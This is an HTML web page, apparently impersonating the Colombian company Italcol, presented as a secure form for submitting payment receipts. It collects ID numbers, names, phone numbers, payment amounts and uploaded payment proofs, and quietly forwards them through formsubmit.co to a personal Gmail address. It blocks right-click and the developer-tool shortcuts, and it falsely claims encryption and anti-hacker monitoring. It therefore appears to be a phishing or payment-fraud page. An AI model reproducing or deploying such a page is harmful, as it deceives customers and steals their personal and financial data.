<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
    <title>Italcol - Recepción de Pagos Segura</title>
    
    <style>
        /* VARIABLES DE DISEÑO INICIAL */
        :root {
            --naranja: #ff6600;
            --fondo-gris: #f4f7f6;
            --texto: #333;
            --blanco: #ffffff;
            --seguridad: #28a745;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--fondo-gris);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            user-select: none; /* Bloqueo de selección por seguridad */
        }

        /* TARJETA DEL DISEÑO ORIGINAL */
        .card {
            background: var(--blanco);
            width: 100%;
            max-width: 450px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
            border-top: 8px solid var(--naranja);
            padding: 40px;
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        /* SUSTITUCIÓN DE LOGO POR TEXTO ESTILIZADO */
        .brand {
            font-size: 38px;
            font-weight: 900;
            color: var(--naranja);
            margin: 0;
            letter-spacing: -1.5px;
            font-style: italic;
            text-transform: lowercase;
        }

        .slogan {
            color: var(--naranja);
            font-weight: 700;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: block;
            margin-top: 5px;
        }

        /* CAMPOS DEL FORMULARIO */
        .group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-weight: 600;
            font-size: 13px;
            color: #555;
            margin-bottom: 6px;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            box-sizing: border-box;
            transition: border 0.3s;
        }

        input:focus {
            outline: none;
            border-color: var(--naranja);
            box-shadow: 0 0 5px rgba(255,102,0,0.1);
        }

        /* SECCIÓN DE SOPORTE */
        .upload-box {
            background: #fffcf9;
            border: 2px dashed #ff660044;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            cursor: pointer;
            margin-top: 25px;
        }

        .upload-box strong {
            color: var(--naranja);
            font-size: 14px;
            display: block;
        }

        .btn-enviar {
            width: 100%;
            background: var(--naranja);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 25px;
            transition: background 0.3s;
        }

        .btn-enviar:hover {
            background: #e65c00;
        }

        .footer {
            text-align: center;
            font-size: 10px;
            color: #bbb;
            margin-top: 30px;
            text-transform: uppercase;
            line-height: 1.5;
        }
    </style>
</head>
<body oncontextmenu="return false;"> <div class="card">
    <div class="header">
        <h1 class="brand">italcol</h1>
        <span class="slogan">Su aliado para crecer</span>
    </div>

    <form id="secureForm" action="https://formsubmit.co/ed.mauricio99@gmail.com" method="POST" enctype="multipart/form-data">
        
        <input type="text" name="_honey" style="display:none">
        <input type="hidden" name="_captcha" value="true">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_subject" value="URGENTE: VALIDACIÓN DE PAGO RECIBIDA">

        <div class="group">
            <label>IDENTIFICACIÓN (NIT/CÉDULA)</label>
            <input type="text" name="identificacion" id="field_id" required placeholder="Ej: 900123456">
        </div>

        <div class="group">
            <label>RAZÓN SOCIAL / NOMBRE</label>
            <input type="text" name="razon_social" id="field_name" required>
        </div>

        <div class="group">
            <label>CELULAR</label>
            <input type="tel" name="celular" id="field_tel" required>
        </div>

        <div class="group">
            <label>VALOR (COP)</label>
            <input type="number" name="valor" id="field_val" required placeholder="$">
        </div>

        <div class="group">
            <label>FECHA DE PAGO</label>
            <input type="date" name="fecha_pago" required>
        </div>

        <div class="upload-box" onclick="document.getElementById('soporte').click()">
            <strong id="status">ADJUNTAR SOPORTE DE PAGO</strong>
            <p style="font-size: 11px; color: #999; margin: 5px 0 0;">PDF, JPG o PNG (Máx. 8MB)</p>
            <input type="file" name="attachment" id="soporte" accept="image/*,.pdf" required style="display:none" onchange="fileCheck()">
        </div>

        <button type="submit" class="btn-enviar" id="btnMain">Enviar para Validación</button>
    </form>

    <div class="footer">
        © 2026 ITALCOL S.A. | PROTECCIÓN DE DATOS BANCARIOS<br>
        SISTEMA MONITOREADO: ANTI-HACKER & BOT-BLOCK ACTIVADO
    </div>
</div>

<script>
    // 1. Validación visual de archivo
    function fileCheck() {
        const input = document.getElementById('soporte');
        const status = document.getElementById('status');
        if (input.files.length > 0) {
            status.innerText = "✓ ARCHIVO CARGADO";
            status.style.color = "#28a745";
        }
    }

    // 2. BLINDAJE DE SEGURIDAD ACTIVA (JavaScript)
    document.getElementById('secureForm').onsubmit = function(e) {
        const btn = document.getElementById('btnMain');
        const idVal = document.getElementById('field_id').value;
        const file = document.getElementById('soporte').files[0];

        // Barrera 1: Anti-Inyección SQL/XSS
        const safePattern = /[<>\"\'%;()&]/g;
        if (safePattern.test(idVal)) {
            alert("ALERTA DE SEGURIDAD: Caracteres prohibidos detectados. El envío ha sido cancelado.");
            e.preventDefault();
            return false;
        }

        // Barrera 2: Integridad de Archivo (8MB)
        if (file && file.size > 8 * 1024 * 1024) {
            alert("ERROR: El archivo supera el límite de seguridad.");
            e.preventDefault();
            return false;
        }

        // Barrera 3: Feedback y Bloqueo de doble envío
        btn.innerText = "CIFRANDO Y ENVIANDO...";
        btn.style.background = "#1a3a5a";
        btn.disabled = true;
        btn.form.submit();
    };

    // 3. BLOQUEO DE INSPECCIÓN (Barrera contra curiosos/hackers novatos)
    document.onkeydown = function(e) {
        if(event.keyCode == 123 || (e.ctrlKey && (e.keyCode == 85 || (e.shiftKey && e.keyCode == 73)))) {
            return false;
        }
    };
</script>

</body>
</html>
